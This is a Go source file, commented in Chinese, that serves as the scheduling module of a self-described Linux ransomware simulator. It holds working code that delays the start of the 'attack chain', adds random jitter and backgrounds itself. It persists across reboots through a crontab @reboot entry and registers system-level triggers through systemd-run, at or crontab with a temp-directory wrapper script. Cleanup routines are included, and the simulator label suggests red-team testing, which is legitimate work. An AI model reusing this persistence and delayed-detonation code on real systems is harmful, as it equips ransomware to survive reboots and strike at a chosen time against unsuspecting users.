// ransom_simulator_linux_schedule.go
// 定时触发模块：支持 --delay / --at / --random-delay 进程内定时，
// 以及 --persist-schedule 注册系统级计划任务（systemd-run -> at -> crontab）。
// 纯标准库实现，无第三方依赖。
package main

import (
	"fmt"
	mrand "math/rand"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

const (
	defaultScheduleTaskName = "RansomSimTask"
	scheduledRunMarker      = "--scheduled-run"
	daemonChildMarker       = "--daemon-child"
	daemonLogFileName       = "scheduler.log"
	doneMarkerPrefix        = ".schedule_done_"
)

// isDaemonChild 判断当前进程是否为自动转入后台的子进程
func isDaemonChild() bool {
	for _, arg := range os.Args[1:] {
		if arg == daemonChildMarker || arg == "-"+strings.TrimLeft(daemonChildMarker, "-") {
			return true
		}
	}
	return false
}

// scheduleTaskNameOf 返回清洗后的任务名（用于自启项与状态文件名）
func scheduleTaskNameOf(raw string) string {
	name := strings.TrimSpace(raw)
	if name == "" {
		name = defaultScheduleTaskName
	}
	var b strings.Builder
	for _, r := range name {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
			b.WriteRune(r)
		} else {
			b.WriteRune('_')
		}
	}
	if b.Len() == 0 {
		return defaultScheduleTaskName
	}
	return b.String()
}

// scheduleLogPath 后台子进程日志路径（程序目录）
func scheduleLogPath() string {
	return filepath.Join(programDir, daemonLogFileName)
}

// buildDaemonArgs 构造后台子进程参数：去掉原定时参数，改为绝对时间 + 子进程标记
func buildDaemonArgs(target time.Time) []string {
	args := stripScheduleFlags(os.Args[1:])
	out := make([]string, 0, len(args)+3)
	for _, a := range args {
		if a == scheduledRunMarker || a == daemonChildMarker {
			continue
		}
		out = append(out, a)
	}
	out = append(out, "--at", target.Format(time.RFC3339), daemonChildMarker)
	return out
}

// 定时任务完成标记，避免重启后重复执行
func doneMarkerPath(opt *options) string {
	return filepath.Join(programDir, doneMarkerPrefix+scheduleTaskNameOf(opt.scheduleTaskName))
}

func clearScheduleDone(opt *options) { _ = os.Remove(doneMarkerPath(opt)) }

func markScheduleDone(opt *options) {
	_ = os.WriteFile(doneMarkerPath(opt), []byte(time.Now().Format(time.RFC3339)+"\n"), 0600)
}

func isScheduleDone(opt *options) bool {
	_, err := os.Stat(doneMarkerPath(opt))
	return err == nil
}

// autoStartMarker crontab 行尾标记，用于识别/清理开机自启
func autoStartMarker(taskName string) string {
	return "# " + scheduleTaskNameOf(taskName) + "-autostart"
}

// registerAutoStart 通过 crontab @reboot 注册开机自启（重启后自动拉起后台等待进程）
func registerAutoStart(opt *options, target time.Time) error {
	tool := resolveToolPath("crontab")
	if tool == "" {
		return fmt.Errorf("未找到 crontab，无法注册开机自启")
	}
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("无法获取程序路径: %w", err)
	}
	exePath, _ = filepath.Abs(exePath)

	args := buildDaemonArgs(target)
	line := fmt.Sprintf("@reboot %s %s >> %s 2>&1 %s",
		shellQuote(exePath),
		strings.Join(quoteAll(args), " "),
		shellQuote(scheduleLogPath()),
		autoStartMarker(opt.scheduleTaskName))

	existing, _ := exec.Command(tool, "-l").Output()
	var kept []string
	for _, l := range strings.Split(string(existing), "\n") {
		if strings.TrimSpace(l) == "" || strings.Contains(l, autoStartMarker(opt.scheduleTaskName)) {
			continue
		}
		kept = append(kept, l)
	}
	kept = append(kept, line)

	install := exec.Command(tool, "-")
	install.Stdin = strings.NewReader(strings.Join(kept, "\n") + "\n")
	if out, runErr := install.CombinedOutput(); runErr != nil {
		return fmt.Errorf("写入 crontab 失败: %v (%s)", runErr, strings.TrimSpace(string(out)))
	}
	if logEnabled {
		logOperation("已注册开机自启 crontab: " + line)
	}
	return nil
}

// removeAutoStart 删除 crontab 中的开机自启行
func removeAutoStart(taskName string) {
	tool := resolveToolPath("crontab")
	if tool == "" {
		return
	}
	existing, _ := exec.Command(tool, "-l").Output()
	var kept []string
	for _, l := range strings.Split(string(existing), "\n") {
		if strings.TrimSpace(l) == "" || strings.Contains(l, autoStartMarker(taskName)) {
			continue
		}
		kept = append(kept, l)
	}
	install := exec.Command(tool, "-")
	install.Stdin = strings.NewReader(strings.Join(kept, "\n") + "\n")
	_, _ = install.CombinedOutput()
}

// resolveToolPath 解析系统工具路径（不存在返回空串）
func resolveToolPath(name string) string {
	p, err := exec.LookPath(name)
	if err != nil {
		return ""
	}
	return p
}

// formatDuration 把时长格式化为人类可读形式
func formatDuration(d time.Duration) string {
	if d < 0 {
		d = 0
	}
	d = d.Round(time.Second)
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	switch {
	case h > 0:
		return fmt.Sprintf("%d小时%02d分%02d秒", h, m, s)
	case m > 0:
		return fmt.Sprintf("%d分%02d秒", m, s)
	default:
		return fmt.Sprintf("%d秒", s)
	}
}

// parseAbsoluteTime 解析 --at 参数，支持以下格式:
//
//	2006-01-02 15:04:05 / 2006-01-02 15:04 / 2006/01/02 15:04:05 / 2006/01/02 15:04
//	RFC3339 (2006-01-02T15:04:05+08:00)
//	15:04:05 / 15:04 (使用当天日期，若已过则顺延到次日)
func parseAbsoluteTime(spec string, now time.Time) (time.Time, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return time.Time{}, fmt.Errorf("时间参数为空")
	}

	layouts := []string{
		"2006-01-02 15:04:05",
		"2006-01-02 15:04",
		"2006/01/02 15:04:05",
		"2006/01/02 15:04",
		time.RFC3339,
		"15:04:05",
		"15:04",
	}

	var lastErr error
	for _, layout := range layouts {
		t, err := time.ParseInLocation(layout, spec, now.Location())
		if err != nil {
			lastErr = err
			continue
		}
		// 仅指定了时分秒（无年月日），使用当天日期
		if t.Year() <= 1 {
			t = time.Date(now.Year(), now.Month(), now.Day(), t.Hour(), t.Minute(), t.Second(), 0, now.Location())
			if !t.After(now) {
				t = t.Add(24 * time.Hour)
			}
		}
		return t, nil
	}

	return time.Time{}, fmt.Errorf("无法解析时间 %q (%v)", spec, lastErr)
}

// resolveStartTime 根据 --delay / --at / --random-delay 计算计划启动时刻
// 返回值 needWait 为 false 表示无需等待，可立即执行
func resolveStartTime(opt *options) (time.Time, bool, error) {
	now := time.Now()

	var target time.Time
	switch {
	case strings.TrimSpace(opt.atTime) != "":
		t, err := parseAbsoluteTime(opt.atTime, now)
		if err != nil {
			return now, false, err
		}
		target = t
	case opt.delay > 0:
		target = now.Add(opt.delay)
	default:
		// 无定时需求：仅保留随机抖动（如配置）
		if opt.randomDelay > 0 {
			jitter := time.Duration(mrand.Int63n(int64(opt.randomDelay) + 1))
			target = now.Add(jitter)
			return target, jitter > 0, nil
		}
		return now, false, nil
	}

	if opt.randomDelay > 0 {
		jitter := time.Duration(mrand.Int63n(int64(opt.randomDelay) + 1))
		target = target.Add(jitter)
	}

	if !target.After(now) {
		return now, false, nil
	}
	return target, true, nil
}

// waitUntilStart 等待到计划时间，返回 true 表示正常到达启动时刻
// 等待期间保持单实例锁，并支持 Ctrl+C / SIGTERM 中断
func waitUntilStart(target time.Time, opt *options) bool {
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(interrupt)

	total := time.Until(target)
	fmt.Printf("\n[阶段 0: 定时触发]\n")
	fmt.Printf("[*] 计划启动时间: %s (剩余 %s)\n", target.Format("2006-01-02 15:04:05"), formatDuration(total))
	if logEnabled {
		logOperation(fmt.Sprintf("进入定时等待，计划启动时间 %s (剩余 %s)", target.Format("2006-01-02 15:04:05"), formatDuration(total)))
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	lastLog := time.Now()

	for {
		select {
		case <-interrupt:
			fmt.Println("\n[!] 收到中断信号，定时等待已取消，任务终止。")
			if logEnabled {
				logOperation("定时等待被中断信号取消")
			}
			return false
		case <-ticker.C:
			remaining := time.Until(target)
			if remaining <= 0 {
				fmt.Printf("\r[*] 定时等待结束，到达启动时刻: %s                \n", time.Now().Format("2006-01-02 15:04:05"))
				if logEnabled {
					logOperation("定时等待结束，开始执行攻击链")
				}
				return true
			}
			elapsed := total - remaining
			percent := 0.0
			if total > 0 {
				percent = float64(elapsed) / float64(total) * 100
			}
			fmt.Printf("\r[*] 定时等待中: %.1f%% 已过 %s / 剩余 %s ", percent, formatDuration(elapsed), formatDuration(remaining))
			if time.Since(lastLog) >= 30*time.Second {
				lastLog = time.Now()
				if logEnabled {
					logOperation(fmt.Sprintf("定时等待进度: %.1f%%，剩余 %s", percent, formatDuration(remaining)))
				}
			}
		}
	}
}

// stripScheduleFlags 从参数中移除定时相关参数，避免计划任务唤起后再次进入等待
func stripScheduleFlags(args []string) []string {
	dropWithValue := map[string]bool{
		"--delay": true, "-delay": true,
		"--at": true, "-at": true,
		"--random-delay": true, "-random-delay": true,
		"--schedule-task-name": true, "-schedule-task-name": true,
	}
	dropAlone := map[string]bool{
		scheduledRunMarker: true,
		daemonChildMarker:  true,
		"--persist-schedule": true, "-persist-schedule": true,
		"--schedule-cleanup": true, "-schedule-cleanup": true,
		"--foreground": true, "-foreground": true,
		"--no-autostart": true, "-no-autostart": true,
	}

	var out []string
	for i := 0; i < len(args); i++ {
		arg := args[i]

		// --flag=value 形式
		if idx := strings.Index(arg, "="); idx > 0 && strings.HasPrefix(arg, "-") {
			name := arg[:idx]
			if dropWithValue[name] || dropAlone[name] {
				continue
			}
			out = append(out, arg)
			continue
		}

		if dropWithValue[arg] {
			i++ // 跳过其取值
			continue
		}
		if dropAlone[arg] {
			continue
		}
		out = append(out, arg)
	}

	out = append(out, scheduledRunMarker)
	return out
}

// wasScheduledRun 判断当前进程是否由计划任务唤起
func wasScheduledRun() bool {
	for _, arg := range os.Args[1:] {
		if arg == scheduledRunMarker {
			return true
		}
	}
	return false
}

// quoteAll 对参数做 shell 转义
func quoteAll(args []string) []string {
	out := make([]string, 0, len(args))
	for _, a := range args {
		out = append(out, shellQuote(a))
	}
	return out
}

// registerPersistentSchedule 注册系统级定时任务
// 依次尝试: systemd-run --on-calendar -> at -> crontab
func registerPersistentSchedule(opt *options, target time.Time) error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("无法获取程序路径: %w", err)
	}
	exePath, _ = filepath.Abs(exePath)

	taskName := strings.TrimSpace(opt.scheduleTaskName)
	if taskName == "" {
		taskName = defaultScheduleTaskName
	}

	runArgs := stripScheduleFlags(os.Args[1:])
	atTime := target.Format("2006-01-02 15:04:05")

	fmt.Printf("[*] 注册系统定时任务: %s (触发时间 %s)\n", taskName, atTime)
	if logEnabled {
		logOperation(fmt.Sprintf("注册系统定时任务 %s，触发时间 %s", taskName, atTime))
	}

	// 1) systemd-run（瞬时 timer，触发后自动清理）；先试系统级，失败再试用户级
	if tool := resolveToolPath("systemd-run"); tool != "" {
		for _, userMode := range []bool{false, true} {
			args := []string{"--on-calendar=" + atTime, "--unit=" + taskName, "--collect"}
			if userMode {
				args = append(args, "--user")
			}
			args = append(args, exePath)
			args = append(args, runArgs...)

			out, err := exec.Command(tool, args...).CombinedOutput()
			if err == nil {
				fmt.Printf("[+] 已通过 systemd-run 注册定时任务: %s\n", taskName)
				return nil
			}
			fmt.Printf("[!] systemd-run(%s) 注册失败: %v (%s)\n",
				map[bool]string{true: "user", false: "system"}[userMode], err, strings.TrimSpace(string(out)))
		}
	}

	// 2) at
	if tool := resolveToolPath("at"); tool != "" {
		cmdStr := shellQuote(exePath) + " " + strings.Join(quoteAll(runArgs), " ")
		cmd := exec.Command(tool, "-t", target.Format("200601021504"))
		cmd.Stdin = strings.NewReader(cmdStr + "\n")
		out, err := cmd.CombinedOutput()
		if err == nil {
			fmt.Printf("[+] 已通过 at 注册定时任务 (触发: %s)\n", atTime)
			return nil
		}
		fmt.Printf("[!] at 注册失败: %v (%s)\n", err, strings.TrimSpace(string(out)))
	}

	// 3) crontab（通过包装脚本在触发后自行清理）
	if tool := resolveToolPath("crontab"); tool != "" {
		scriptPath := filepath.Join(os.TempDir(), taskName+".sh")
		cmdStr := shellQuote(exePath) + " " + strings.Join(quoteAll(runArgs), " ")
		content := "#!/bin/sh\n" + cmdStr + "\n"
		if opt.scheduleCleanup {
			content += fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s' | crontab -) 2>/dev/null\n", taskName)
		}
		if err := os.WriteFile(scriptPath, []byte(content), 0755); err != nil {
			return fmt.Errorf("写入调度脚本失败: %w", err)
		}

		cronLine := fmt.Sprintf("%d %d %d %d * %s # %s",
			target.Minute(), target.Hour(), target.Day(), int(target.Month()), scriptPath, taskName)

		existing, _ := exec.Command(tool, "-l").Output()
		newCron := strings.TrimRight(string(existing), "\n")
		if newCron != "" {
			newCron += "\n"
		}
		newCron += cronLine + "\n"

		install := exec.Command(tool, "-")
		install.Stdin = strings.NewReader(newCron)
		if out, err := install.CombinedOutput(); err != nil {
			return fmt.Errorf("crontab 写入失败: %v (%s)", err, strings.TrimSpace(string(out)))
		}
		fmt.Printf("[+] 已通过 crontab 注册定时任务: %s (触发: %s, 脚本: %s)\n", taskName, atTime, scriptPath)
		return nil
	}

	return fmt.Errorf("未找到可用的调度工具 (systemd-run / at / crontab)")
}

// cleanupPersistentSchedule 清理系统级定时任务与开机自启
func cleanupPersistentSchedule(taskName string) {
	if strings.TrimSpace(taskName) == "" {
		taskName = defaultScheduleTaskName
	}

	removeAutoStart(taskName)

	if tool := resolveToolPath("systemctl"); tool != "" {
		_ = exec.Command(tool, "stop", taskName+".timer").Run()
		_ = exec.Command(tool, "reset-failed", taskName+".timer").Run()
	}

	if tool := resolveToolPath("crontab"); tool != "" {
		existing, _ := exec.Command(tool, "-l").Output()
		if strings.Contains(string(existing), taskName) {
			var kept []string
			for _, line := range strings.Split(string(existing), "\n") {
				if line == "" || strings.Contains(line, taskName) {
					continue
				}
				kept = append(kept, line)
			}
			install := exec.Command(tool, "-")
			install.Stdin = strings.NewReader(strings.Join(kept, "\n") + "\n")
			_, _ = install.CombinedOutput()
		}
	}

	_ = os.Remove(filepath.Join(os.TempDir(), taskName+".sh"))

	fmt.Printf("[+] 系统定时任务已清理: %s\n", taskName)
	if logEnabled {
		logOperation("系统定时任务已清理: " + taskName)
	}
}